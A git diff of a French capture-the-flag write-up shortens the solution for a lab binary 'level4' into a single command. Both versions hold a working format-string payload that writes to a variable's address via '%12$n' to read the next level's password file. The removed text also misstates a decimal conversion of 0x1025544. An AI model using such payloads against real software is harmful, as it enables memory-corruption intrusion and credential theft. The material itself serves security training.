@@ -58,66 +58,12 @@ Pour exploiter la vulnérabilité, nous devons trouver la position de notre cha�
 
    Nous voyons `0x41414141` (qui représente "AAAA" en ASCII) à la 12ème position dans la sortie. Cela signifie que notre chaîne injectée est le 12ème argument de `printf`.
 
-### Construction du payload
 
-Nous devons construire un payload qui écrit `0x1025544` (16850436 en décimal) à l'adresse de la variable `m`.
 
-1. **Inclure l'adresse de `m` en format little-endian** :
-
-   ```bash
-   python -c 'print("\x10\x98\x04\x08")' > /tmp/exploit
-   ```
-
-2. **Ajouter la chaîne de format pour écrire `0x1025544`** :
-
-   ```bash
-   echo -ne "%016930112x%12\$n" >> /tmp/exploit
-   ```
-
-### Exécution du payload
-
-Pour exploiter le programme `level4` :
+#### a. Exploitation par constructions du payload
 
 ```bash
-cat /tmp/exploit - | ./level4
-```
-
-### Vérification
-
-Après l'exploitation, le programme devrait afficher le contenu de `/home/user/level5/.pass`.
-
-## Déroulement complet
-
-### 1. Identification de la position de l'argument
-
-```bash
-python -c 'print "AAAA" + " %x" * 20' | ./level4
-```
-
-Sortie :
-
-```
-AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
-```
-
-### 2. Construction du payload
-
-#### a. Générer la partie initiale du payload
-
-```bash
-python -c 'print("\x10\x98\x04\x08")' > /tmp/exploit
-```
-
-#### b. Ajouter la chaîne de format
-
-```bash
-echo -ne "%016930112x%12\$n" >> /tmp/exploit
-```
-
-### 3. Exécution du payload
-
-```bash
-cat /tmp/exploit - | ./level4
+(python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")'; cat -) | ./level4
 ```
 
 ### Conclusion
